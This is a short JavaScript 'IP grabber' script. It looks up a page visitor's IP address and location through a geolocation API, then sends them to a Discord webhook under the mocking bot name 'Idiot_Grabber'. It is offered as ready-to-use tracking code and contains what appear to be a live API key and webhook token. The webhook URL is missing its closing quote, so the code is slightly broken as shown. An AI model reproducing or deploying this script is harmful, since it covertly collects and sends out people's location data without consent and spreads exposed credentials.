$.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=ea884db841d3403da10a7cc39cc75c70", function(data) { //Make sure to use this api or use another but you got to change the values down below
    var request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/984875367389081661/y5GiRnZ0CQXd5s3897AGXJy2FUbOEMzcq7Jcx72Dv61zBTVJWKzJHbLKfJG_2u7X42A_);

    request.setRequestHeader('Content-type', 'application/json');

    var t = {
      username: "Idiot_Grabber",
      avatar_url: "https://i.imgur.com/1h97XvJ_d.webp?maxwidth=760&fidelity=grand",
      content: "",
      embeds: [{
          color: "16711744",
          title: "IDIOT INFO",
          fields: [
            {name: "IP", value: data.ip_address},
            {name: "CITY", value: data.city},
            {name: "COUNTRY", value: data.country},
            {name: "CONTINENT", value: data.continent},
          ],
          footer: {
              text: "LerQxD"
          }
      }]
  };

    request.send(JSON.stringify(t));
})